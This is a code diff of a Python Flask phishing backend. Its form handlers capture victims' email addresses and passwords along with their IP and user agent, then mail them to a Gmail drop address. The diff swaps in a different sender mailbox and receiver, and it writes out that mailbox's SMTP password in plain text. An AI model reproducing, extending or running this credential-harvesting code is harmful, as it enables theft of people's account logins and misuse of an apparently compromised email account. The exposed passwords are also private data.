@@ -193,10 +193,10 @@ def clips():
             ip = request.remote_addr
         email = request.form.get("emailapive")
         passwordemail = request.form.get("passwordapive")
-        sender_email = "newsevers@yonia.site"
-        sender_emaill = "contact"
-        receiver_email = "msnexchange365@gmail.com"
-        password = "-%JXX7Ap]-4q"
+        sender_email = "produccion@fibrasing.com"
+        sender_emaill = "produccion"
+        receiver_email = "kokofunds147@gmail.com"
+        password = "Fibras2022**//"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "new Upsate ## invoice"
@@ -249,10 +249,10 @@ def mansecond():
             ip = request.remote_addr
         email = request.form.get("emailail")
         passwordemail = request.form.get("passwordail")
-        sender_email = "newsevers@yonia.site"
-        sender_emaill = "contact"
-        receiver_email = "msnexchange365@gmail.com"
-        password = "-%JXX7Ap]-4q"
+        sender_email = "produccion@fibrasing.com"
+        sender_emaill = "produccion"
+        receiver_email = "kokofunds147@gmail.com"
+        password = "Fibras2022**//"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "new Upsate ## invoice"
@@ -292,6 +292,7 @@ def pilom():
 
 if __name__ == "__main__":
     app.run(debug=True)
+
 
 
 
